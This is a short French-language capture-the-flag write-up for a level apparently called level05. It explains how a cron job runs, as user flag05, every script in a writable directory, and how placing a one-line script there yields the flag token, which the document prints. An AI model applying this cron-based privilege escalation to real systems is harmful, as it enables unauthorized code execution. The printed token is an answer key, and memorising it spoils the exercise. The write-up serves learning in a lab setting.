# level05

lorsqu'on se connecte en ssh on a un message: `You have new mail.`

Lorsqu'on regarde le env on voit:
```
MAIL=/var/mail/level05
```

dans se fichier on voit: 
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

`*/2 * * * *` Signifie que le script est executé toute les 2m

Si on arrive à mettre ce qu'on veut dans /usr/sbin/openarenaserver peut etre que l'on pourra executé se que l'on veut ?

Mais on a n'y les droit d'exec ni les droits de modifier le fichier.

En revanche on regarde son contenu et on voit que le script exec tout ce qui se trouve dans `/opt/openarenaserver` dans un sous shell 

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Il suffit maintenant de faire un petit script dans opt/openarenaserver

Ce script doit executé getflag et redirigé l'output car il executé dans un sous-shell

le script:
```bash
getflag > /tmp/output_getflag
```
plus qu'a attendre 2m

et voila: le contenu du fichier `/tmp/output_getflag`

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
